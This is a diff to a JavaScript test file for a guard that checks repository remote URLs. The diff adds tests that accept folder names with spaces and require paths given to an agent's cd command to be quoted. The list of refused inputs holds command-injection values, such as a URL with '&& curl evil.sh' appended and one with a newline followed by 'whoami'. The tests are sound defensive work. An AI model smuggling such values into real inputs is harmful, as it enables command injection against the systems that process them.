@@ -168,7 +168,7 @@ test("injection is still refused, which is this guard's actual job", () => {
     'https://host/o/r && curl evil.sh',
     'https://host/o/r\nwhoami',
     "https://host/o/r'",
-    'file:///tmp/a b',
+    'file:///tmp/a\tb',
     '',
     '   ',
   ]) {
@@ -176,6 +176,25 @@ test("injection is still refused, which is this guard's actual job", () => {
   }
   assert.equal(isSafeRepoRemote(null), false)
   assert.equal(isSafeRepoRemote(42), false)
+})
+
+test('a folder with a space in its name is not thrown away', () => {
+  // Refusing these cost the whole row, and a person who keeps their work in
+  // "My Projects" is not doing anything unusual. The space is made safe by
+  // quoting where the value is embedded, not by refusing the person.
+  const spaced = 'file:///Users/someone/My Projects/skyway'
+  assert.equal(isSafeRepoRemote(spaced), true)
+  assert.equal(sanitizeInboxRows([{ title: 'x', n_page: 2, repo_remote: spaced, safety_branch: 'designless/abc' }]).length, 1)
+})
+
+test('a path an agent is told to cd into is quoted', () => {
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-quote-')))
+  const repo = path.join(root, 'my site'); fs.mkdirSync(repo)
+  execFileSync('git', ['init', '-q'], { cwd: repo })
+  const out = summarizeInbox([{ title: 'Skyway', n_page: 1, repo_remote: `file://${repo}`, safety_branch: 'designless/abc' }], root)
+  const said = out?.line || (Array.isArray(out?.lines) ? out.lines.join(' ') : String(out ?? ''))
+  assert.ok(said.includes(`'${repo}'`), `the path must be quoted or a space splits it in two: ${said.slice(0, 200)}`)
+  fs.rmSync(root, { recursive: true, force: true })
 })
 
 test('a malformed remote still drops its row; an absent one does not', () => {
